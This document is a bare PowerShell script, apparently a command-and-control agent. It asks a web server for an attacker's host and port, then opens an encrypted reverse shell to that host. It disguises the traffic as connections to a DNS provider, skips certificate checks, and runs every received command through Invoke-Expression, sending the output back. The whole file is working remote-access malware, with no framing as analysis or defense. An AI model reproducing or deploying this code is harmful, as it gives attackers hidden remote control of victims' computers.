$web_host = "http://127.0.0.1:5000/";

$cli_header = @{"requesting_for"=0};

while ($True) {
	$response = Invoke-WebRequest -Uri ($web_host+"con") -Body ($cli_header|ConvertTo-Json) -ContentType "application/json";
	if ($response.statuscode -eq '200') {
		$data = ConvertFrom-Json $response.Content;
		$lhost = $data | Select-Object -expand "lhost";
		$lport = $data | Select-Object -expand "lport";
		
		$TCPClient = New-Object Net.Sockets.TCPClient($lhost, $lport);
		$NetworkStream = $TCPClient.GetStream();
		$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
		$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);

		if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
			$SslStream.Close();
			continue
		}

		$StreamWriter = New-Object IO.StreamWriter($SslStream);
		function WriteToStream ($String) {
			[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};
			$StreamWriter.Write($String + 'SHELL> ');
			$StreamWriter.Flush()};
		WriteToStream '';
		while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
			$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
			$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}
			WriteToStream ($Output)
		}
		$StreamWriter.Close()
		$SslStream.Close();
	}
	Start-Sleep -Seconds 1
}
